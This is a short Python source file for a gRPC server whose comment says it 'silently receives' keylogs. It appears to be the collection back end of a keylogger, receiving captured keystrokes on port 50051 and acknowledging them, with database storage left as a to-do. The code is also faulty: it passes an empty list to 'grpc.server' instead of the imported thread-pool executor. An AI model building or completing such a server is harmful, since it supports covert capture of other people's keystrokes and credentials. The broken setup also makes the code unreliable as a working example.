from concurrent.futures import ThreadPoolExecutor
import grpc
import logservice_pb2
import logservice_pb2_grpc


# The class that implements the service methods defined in logservice.proto
class LogServiceServicer(logservice_pb2_grpc.LogServiceServicer):

    # Implement the Unary RPC method
    def SendLog(self, request, context):
        # The server silently receives the data (keylogs) + Determine the number of lines received
        log_lines = request.log_content.splitlines()
        # later we need to save the request.log file in the database

        # response message to confirm the success
        return logservice_pb2.SendLogResponse(
            success=True,
            message=f"Successfully processed {len(log_lines)} log lines."
        )


def serve():
    # Creating a gRPC server
    server = grpc.server([])
    # Adding the implemented service to the server
    logservice_pb2_grpc.add_LogServiceServicer_to_server(LogServiceServicer(), server)

    server_address = '[::]:50051' # 50051 is the standard gRPC port
    server.add_insecure_port(server_address)
    server.start()
    server.wait_for_termination()


if __name__ == '__main__':
    serve()
